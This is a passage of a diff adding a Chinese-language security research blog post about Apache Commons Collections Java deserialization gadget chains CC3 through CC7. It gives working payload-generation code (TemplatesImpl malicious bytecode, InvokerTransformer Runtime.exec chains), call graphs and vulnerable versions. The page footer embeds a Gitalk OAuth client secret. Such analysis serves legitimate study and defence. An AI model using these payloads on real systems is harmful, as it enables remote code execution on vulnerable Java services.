+<li>利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get/set 等操作，配合 LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，利用了 InstantiateTransformer 实例化 TrAXFilter 类，并调用 TemplatesImpl 的 newTransformer 方法实例化恶意类字节码触发漏洞。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.functors.InstantiateTransformer#transform()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>AnnotationInvocationHandler.readObject()
+   Map(Proxy).entrySet()
+        AnnotationInvocationHandler.invoke()
+            LazyMap.get()
+                ChainedTransformer.transform()
+                    ConstantTransformer.transform()
+                        InstantiateTransformer.transform()
+                            TemplatesImpl.newTransformer()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections : 3.1～3.2.1<br>
+jdk &lt; 7u21</p>
+</blockquote>
+<h1 id="commonscollections4">CommonsCollections4</h1>
+<p>CC4 是 CC2 的一个变种，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer，再利用 InstantiateTransformer 实例化 TemplatesImpl，排列组合了属于是。</p>
+<p>ysoserial 的 CC4 没什么意思，在这里补充一个对 PriorityQueue 的替代链 TreeBag。</p>
+<h2 id="前置知识-4">前置知识</h2>
+<h3 id="treebag-treemap">TreeBag &amp; TreeMap</h3>
+<p>在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。</p>
+<p>除了 PriorityQueue，还能否找到其他的提供排序的类，在反序列化时会调用到比较器呢？于是找到了 TreeBag。</p>
+<p>对于 Bag 我很陌生，所以这里简单介绍一下。</p>
+<p>Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。</p>
+<p>TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。</p>
+<p>TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1626942671976.png" alt="" loading="lazy"></figure>
+<p>在对 TreeBag 反序列化时，会将反序列化出来的 Comparator 对象交给 TreeMap 实例化，并调用父类的 <code>doReadObject</code> 方法处理：</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1626942427419.png" alt="" loading="lazy"></figure>
+<p>而 <code>doReadObject</code> 方法会向 TreeMap 中 put 数据。</p>
+<figure data-type="image" tabindex="19"><img src="https://su18.org/post-images/1626942445176.png" alt="" loading="lazy"></figure>
+<p>类似优先级队列，对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而 TreeBag 则是依赖了 TreeMap 在 put 数据时会调用 compare 进行排序的特点来实现数据顺序的保存。</p>
+<figure data-type="image" tabindex="20"><img src="https://su18.org/post-images/1626942686842.png" alt="" loading="lazy"></figure>
+<p>毫无疑问，compare 方法中调用了 comparator 进行比较，那我们就可以使用 TransformingComparator 触发后续的逻辑。</p>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1626942679975.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造-4">攻击构造</h2>
+<p>CC4 攻击链用的都是之前的知识点，只是不同的组合，不再分析，直接上代码：</p>
+<pre><code class="language-java">public class CC4 {
+
+	public static String fileName = &quot;CC4.bin&quot;;
+
+	public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+
+		// 读取恶意类 bytes[]
+		InputStream inputStream = CC4.class.getResourceAsStream(&quot;EvilClassForCC4.class&quot;);
+		byte[]      bytes       = new byte[inputStream.available()];
+		inputStream.read(bytes);
+
+		// 初始化 TemplatesImpl 对象
+		TemplatesImpl tmpl      = new TemplatesImpl();
+		Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+		bytecodes.setAccessible(true);
+		bytecodes.set(tmpl, new byte[][]{bytes});
+		// _name 不能为空
+		Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+		name.setAccessible(true);
+		name.set(tmpl, &quot;su18&quot;);
+
+		// 结合 ChainedTransformer
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+				new ConstantTransformer(TrAXFilter.class),
+				new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
+		});
+
+		TransformingComparator comparator = new TransformingComparator(chain);
+
+		// 在初始化时不带入 comparator
+		PriorityQueue&lt;String&gt; queue = new PriorityQueue&lt;&gt;(2);
+		queue.add(&quot;1&quot;);
+		queue.add(&quot;2&quot;);
+
+		Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+		field.setAccessible(true);
+		field.set(queue, comparator);
+
+		SerializeUtil.writeObjectToFile(queue, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+}
+</code></pre>
+<p>使用 TreeBag &amp; TreeMap 构造的 payload：</p>
+<pre><code class="language-java">public class CC4WithTreeBag {
+
+	public static String fileName = &quot;CC4WithTreeBag.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 读取恶意类 bytes[]
+		InputStream inputStream = CC4WithTreeBag.class.getResourceAsStream(&quot;EvilClassForCC4.class&quot;);
+		byte[]      bytes       = new byte[inputStream.available()];
+		inputStream.read(bytes);
+
+		// 初始化 TemplatesImpl 对象
+		TemplatesImpl tmpl      = new TemplatesImpl();
+		Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+		bytecodes.setAccessible(true);
+		bytecodes.set(tmpl, new byte[][]{bytes});
+		// _name 不能为空
+		Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+		name.setAccessible(true);
+		name.set(tmpl, &quot;su18&quot;);
+
+		// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
+		// 这个类是 public 的，方便调用
+		Transformer            transformer = new InvokerTransformer(&quot;toString&quot;, new Class[]{}, new Object[]{});
+		TransformingComparator comparator  = new TransformingComparator(transformer);
+
+		// prepare CommonsCollections object entry point
+		TreeBag tree = new TreeBag(comparator);
+		tree.add(tmpl);
+
+		Field field = InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);
+		field.setAccessible(true);
+		field.set(transformer, &quot;newTransformer&quot;);
+
+		SerializeUtil.writeObjectToFile(tree, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+}
+</code></pre>
+<h2 id="总结-4">总结</h2>
+<p>以上就是 CC4 链分析的全部内容了，最后总结一下。</p>
+<p>ysoserial CC4：</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>使用 PriorityQueue 反序列化时触发的 TransformingComparator 的 compare 方法，就会触发 ChainedTransformer 的 tranform 方法链，其中利用 InstantiateTransformer 实例化 TrAXFilter 类，此类实例化时会调用 TemplatesImpl 的 newTransformer 实例化恶意类，执行恶意代码。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.functors.InstantiateTransformer#transform()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PriorityQueue.readObject()
+    TransformingComparator.compare()
+        *ChainedTransformer.transform()
+                InvokerTransformer.transform()
+                    InstantiateTransformer.transform()
+                        TemplatesImpl.newTransformer()    
+</code></pre>
+<p>TreeBag 总结：</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>用 TreeBag 代替  PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>org.apache.commons.collections4.bag.TreeBag#readObject</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>java.util.TreeMap#put()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>org.apache.commons.collections4.bag.TreeBag.readObject()
+    org.apache.commons.collections4.bag.AbstractMapBag.doReadObject()
+        java.util.TreeMap.put()
+            java.util.TreeMap.compare()
+                org.apache.commons.collections4.comparators.TransformingComparator.compare()
+                        org.apache.commons.collections4.functors.InvokerTransformer.transform()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections4 : 4.0</p>
+</blockquote>
+<h1 id="commonscollections5">CommonsCollections5</h1>
+<p>CC5 依旧是 LazyMap 加 ChainedTransformer 的触发模式，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他的方式。</p>
+<p>因为 jdk 在 1.8 之后对 AnnotationInvocationHandler 类进行了修复，所以在 jdk 1.8 版本就必须找出能替代 AnnotationInvocationHandler 的新的可以利用的类。</p>
+<h2 id="前置知识-5">前置知识</h2>
+<h3 id="tiedmapentry">TiedMapEntry</h3>
+<p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 是一个 <code>Map.Entry</code> 的实现类，从名称中可以看到，这是一个绑定了底层 map 的 Entry，用来使一个 map entry 对象拥有在底层修改 map 的功能。</p>
+<p>TiedMapEntry 中有一个成员属性 Map，这就是  <code>Map.Entry</code> 的底层 map，TiedMapEntry 的 <code>getValue()</code> 方法会调用底层 map 的 <code>get()</code> 方法，我们可以用来触发 LazyMap 的 get。那谁会调用 <code>getValue()</code> 方法呢？我们发现 TiedMapEntry 的 equals/hashCode/toString 都可以触发。</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1626857344080.png" alt="" loading="lazy"></figure>
+<p>equals/hashCode 让我们想到了 URLDNS 的 HashMap，不过在 CC5 中我们用的是 <code>toString()</code> 方法。</p>
+<p>接下来需要找到一个类在反序列化时会触发 TiedMapEntry 的 <code>toString()</code> 方法。</p>
+<h3 id="badattributevalueexpexception">BadAttributeValueExpException</h3>
+<p>于是找到了 <code>javax.management.BadAttributeValueExpException</code> 这个类，反序列化读取 val，当 <code>System.getSecurityManager() == null</code> 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 <code>toString()</code> 方法，完成上面 TiedMapEntry 的构造。</p>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1626857576958.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造-5">攻击构造</h2>
+<p>使用上述两个新扩展的触发点，配合 LazyMap 就可以完成一条新的攻击路径。由于 ysoserial 使用了 ChainedTransformer + InvokerTransformer 的方式，我这里也同样使用这种方式，当然还可以使用<br>
+InvokerTransformer + TemplatesImpl/TrAXFilter + InstantiateTransformer + TemplatesImpl 的方式触发，在上面的例子中都有使用，这里不再重复罗列。</p>
+<p>最终的恶意代码如下：</p>
+<pre><code class="language-java">public class CC5 {
+
+	public static String fileName = &quot;CC5.bin&quot;;
+
+	public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+
+		// 创建 ChainedTransformer
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+		});
+
+		// 创建 LazyMap 并引入 TiedMapEntry
+		Map          lazyMap = LazyMap.decorate(new HashMap(), chain);
+		TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;su18&quot;);
+
+		// 实例化 BadAttributeValueExpException 并反射写入
+		BadAttributeValueExpException exception = new BadAttributeValueExpException(&quot;su18&quot;);
+		Field                         field     = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);
+		field.setAccessible(true);
+		field.set(exception, entry);
+
+		SerializeUtil.writeObjectToFile(exception, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>需要注意的是，BadAttributeValueExpException 构造方法会直接调用 val 的 <code>toString()</code> 触发，所以需要反射写进去。</p>
+<h2 id="总结-5">总结</h2>
+<p>以上就是 CC5 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>反序列化 BadAttributeValueExpException 调用 TiedMapEntry 的 toString 方法，间接调用了 LazyMap 的 get 方法，触发了后续的 Transformer 恶意执行链。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>javax.management.BadAttributeValueExpException#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#toString()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>BadAttributeValueExpException.readObject()
+   TiedMapEntry.toString()
+        LazyMap.get()
+            ChainedTransformer.transform()
+                ConstantTransformer.transform()
+                    InvokerTransformer.transform()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections : 3.1～3.2.1<br>
+jdk 8u76 without  a security manager</p>
+</blockquote>
+<h1 id="commonscollections6">CommonsCollections6</h1>
+<p>在 CC5 中我们使用了 <code>TiedMapEntry#toString</code> 来触发 <code>LazyMap#get</code>，在 CC6 中是通过 <code>TiedMapEntry#hashCode</code> 来触发。之前看到了 hashcode 方法也会调用 <code>getValue()</code> 方法然后调用到其中 map 的 get 方法触发 LazyMap，那我们如何在反序列化时触发 TiedMapEntry 的 hashcode 方法呢？</p>
+<p>之前在 URLDNS 中，我们发现，在反序列化一个 HashMap 对象时，会调用 key 对象的 hashCode 方法计算 hash 值。那在此处当然也可以用来触发  TiedMapEntry 的 hashCode 方法。</p>
+<p>那就要面临在 URLDNS 中同样面临的问题：调用链会在 HashMap 的 put 方法调用时提前触发，需要想办法绕过触发，可以采用以下几种方式:</p>
+<ul>
+<li>类似 URLDNS2 的利用反射调用 putVal 方法写入 key 避免触发。</li>
+<li>在向 HashMap push LazyMap 时先给个空的 ChainedTransformer，这样添加的时候不会执行任何恶意动作，put 之后再反射将有恶意链的 Transformer 数组写到 ChainedTransformer 中。</li>
+</ul>
+<p>这样就完成了一个 HashMap 的触发方式。</p>
+<p>但是我们突然想到：咦？HashMap 的 put 方法可以触发 key 的 hashCode ，那还有没有入口类能触发这个方法了？</p>
+<p>于是就有了 CC6 的 HashSet 触发方式。</p>
+<h2 id="前置知识-6">前置知识</h2>
+<h3 id="hashset">HashSet</h3>
+<p>HashSet 是一个无序的，不允许有重复元素的集合。HashSet 本质上就是由 HashMap 实现的。HashSet 中的元素都存放在 HashMap 的 key 上面，而 value 中的值都是统一的一个<code>private static final Object PRESENT = new Object();</code>。HashSet 跟 HashMap 一样，都是一个存放链表的数组。</p>
+<p>在 HashSet 的 readObject 方法中，会调用其内部 HashMap 的 put 方法，将值放在 key 上。</p>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1626922149617.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造-6">攻击构造</h2>
+<p>首先是结合 LazyMap 和 HashMap 的方式，这里使用了之前在 URLDNS2 中的反射代码，以及同时写了包含 Fake Chain 绕过触发的方式。</p>
+<pre><code class="language-java">public class CC6WithHashMap {
+
+	public static String fileName = &quot;CC6WithHashMap.bin&quot;;
+
+	public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException {
+
+		// 初始化 HashMap
+		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+		// 创建 ChainedTransformer
+		Transformer[] transformers = new Transformer[]{
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+		};
+
+		// 创建一个空的 ChainedTransformer
+		ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});
+
+		// 创建 LazyMap 并引入 TiedMapEntry
+		Map          lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
+		TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;su18&quot;);
+
+		hashMap.put(entry, &quot;su18&quot;);
+
+		//用反射再改回真的chain
+		Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+		f.setAccessible(true);
+		f.set(fakeChain, transformers);
+		//清空由于 hashMap.put 对 LazyMap 造成的影响
+		lazyMap.clear();
+
+		// 反射调用 HashMap 的 putVal 方法
+//		Method[] m = Class.forName(&quot;java.util.HashMap&quot;).getDeclaredMethods();
+//		for (Method method : m) {
+//			if (&quot;putVal&quot;.equals(method.getName())) {
+//				method.setAccessible(true);
+//				method.invoke(hashMap, -1, entry, 0, false, true);
+//			}
+//		}
+
+		SerializeUtil.writeObjectToFile(hashMap, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>比较简单，就是一个缝合。接下来看一下第二种 HashSet 的触发方式。</p>
+<pre><code class="language-java">public class CC6WithHashSet {
+
+	public static String fileName = &quot;CC6WithHashSet.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 初始化 HashMap
+		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+
+		// 创建 ChainedTransformer
+		Transformer[] transformers = new Transformer[]{
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+		};
+
+		// 创建一个空的 ChainedTransformer
+		ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});
+
+		// 创建 LazyMap 并引入 TiedMapEntry
+		Map          lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
+		TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;su18&quot;);
+
+		hashMap.put(entry, &quot;su18&quot;);
+
+		HashSet set = new HashSet(hashMap.keySet());
+
+		//用反射再改回真的chain
+		Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+		f.setAccessible(true);
+		f.set(fakeChain, transformers);
+		//清空由于 hashMap.put 对 LazyMap 造成的影响
+		lazyMap.clear();
+
+		SerializeUtil.writeObjectToFile(set, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+}
+</code></pre>
+<p>可以看到我们只是简单的在 HashMap 之外嵌套了一层 HashSet。在 ysoserial 中的 CC6 payload 中，作者 matthias_kaiser 多次使用反射向 HashMap 及 HashSet 中写入值，并兼容了 JDK 7 和 8 中成员变量名发生变化的情况。并且是通过向底层 map 中的 节点添加的方式。</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1626924401992.png" alt="" loading="lazy"></figure>
+<p>就我个人而言，感觉这种方式有点过于冗杂了，不如使用空 Transformer 链反射的方式，大大方方的向 HashMap 或 HashSet 中 push 数据。</p>
+<h2 id="总结-6">总结</h2>
+<p>以上就是 CC6 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>反序列化 调用 TiedMapEntry 的 toString 方法，简介调用了 LazyMap 的 hashCode 方法，触发了后续的 Transformer 恶意执行链。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashSet#readObject()</code>/<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashSet.readObject()/HashMap.readObject()
+    HashMap.put()
+        HashMap.hash()
+            TiedMapEntry.hashCode()
+                LazyMap.get()
+                    ChainedTransformer.transform()
+                        InvokerTransformer.transform()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections : 3.1～3.2.1</p>
+</blockquote>
+<h1 id="commonscollections7">CommonsCollections7</h1>
+<p>CC7 依旧是寻找 LazyMap 的触发点，这次用到了 Hashtable。</p>
+<h2 id="前置知识-7">前置知识</h2>
+<h3 id="hashtable">Hashtable</h3>
+<p>Hashtable 与 HashMap 十分相似，是一种 key-value 形式的哈希表，但仍然存在一些区别：</p>
+<ul>
+<li>HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary ，可以说是一个过时的类。</li>
+<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
+<li>Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key=null 的实体放在 index=0 的位置。</li>
+<li>Hashtable 线程安全，HashMap 线程不安全。</li>
+</ul>
+<p>那既然两者如此相似，Hashtable 的内部逻辑能否触发反序列化漏洞呢？答案是肯定的。</p>
+<p>Hashtable 的 readObject 方法中，最后调用了 <code>reconstitutionPut</code> 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。</p>
+<figure data-type="image" tabindex="26"><img src="https://su18.org/post-images/1626933623624.png" alt="" loading="lazy"></figure>
+<p><code>reconstitutionPut</code> 调用了 key 的 hashCode 方法。</p>
+<figure data-type="image" tabindex="27"><img src="https://su18.org/post-images/1626934169284.png" alt="" loading="lazy"></figure>
+<p>其实这个调用逻辑是与 HashMap 差不多的。</p>
+<h2 id="攻击构造-7">攻击构造</h2>
+<p>攻击调用代码与 HashMap 几乎一模一样：</p>
+<pre><code class="language-java">public class CC7 {
+
+	public static String fileName = &quot;CC7.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+		// 初始化 HashMap
+		Hashtable&lt;Object, Object&gt; hashtable = new Hashtable&lt;&gt;();
+
+		// 创建 ChainedTransformer
+		Transformer[] transformers = new Transformer[]{
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+		};
+
+		// 创建一个空的 ChainedTransformer
+		ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});
+
+		// 创建 LazyMap 并引入 TiedMapEntry
+		Map          lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
+		TiedMapEntry entry   = new TiedMapEntry(lazyMap, &quot;su18&quot;);
+
+		hashtable.put(entry, &quot;su18&quot;);
+
+		//用反射再改回真的chain
+		Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+		f.setAccessible(true);
+		f.set(fakeChain, transformers);
+		//清空由于 hashtable.put 对 LazyMap 造成的影响
+		lazyMap.clear();
+
+		SerializeUtil.writeObjectToFile(hashtable, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+}
+
+</code></pre>
+<h2 id="总结-7">总结</h2>
+<p>以上就是 CC7 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>用 Hashtable 代替  HashMap 触发 LazyMap 方式，与 CC6 HashMap 几乎一致。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.Hashtable#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>Hashtable.readObject()
+   TiedMapEntry.hashCode()
+        LazyMap.get()
+            ChainedTransformer.transform()
+                ConstantTransformer.transform()
+                    InvokerTransformer.transform()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections : 3.1</p>
+</blockquote>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#commonscollections1">CommonsCollections1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#abstractmapdecorator">AbstractMapDecorator</a>
+<ul>
+<li><a href="#transformedmap">TransformedMap</a></li>
+<li><a href="#lazymap">LazyMap</a></li>
+</ul>
+</li>
+<li><a href="#transformer">Transformer</a>
+<ul>
+<li><a href="#invokertransformer">InvokerTransformer</a></li>
+<li><a href="#chainedtransformer">ChainedTransformer</a></li>
+<li><a href="#constanttransformer">ConstantTransformer</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections2">CommonsCollections2</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2">前置知识</a>
+<ul>
+<li><a href="#priorityqueue">PriorityQueue</a></li>
+<li><a href="#transformingcomparator">TransformingComparator</a></li>
+<li><a href="#templatesimpl">TemplatesImpl</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-2">总结</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections3">CommonsCollections3</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3">前置知识</a>
+<ul>
+<li><a href="#traxfilter">TrAXFilter</a></li>
+<li><a href="#instantiatetransformer">InstantiateTransformer</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-3">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-3">总结</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections4">CommonsCollections4</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-4">前置知识</a>
+<ul>
+<li><a href="#treebag-treemap">TreeBag &amp; TreeMap</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-4">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-4">总结</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections5">CommonsCollections5</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-5">前置知识</a>
+<ul>
+<li><a href="#tiedmapentry">TiedMapEntry</a></li>
+<li><a href="#badattributevalueexpexception">BadAttributeValueExpException</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-5">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-5">总结</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections6">CommonsCollections6</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-6">前置知识</a>
+<ul>
+<li><a href="#hashset">HashSet</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-6">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-6">总结</a></li>
+</ul>
+</li>
+<li><a href="#commonscollections7">CommonsCollections7</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-7">前置知识</a>
+<ul>
+<li><a href="#hashtable">Hashtable</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-7">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-7">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
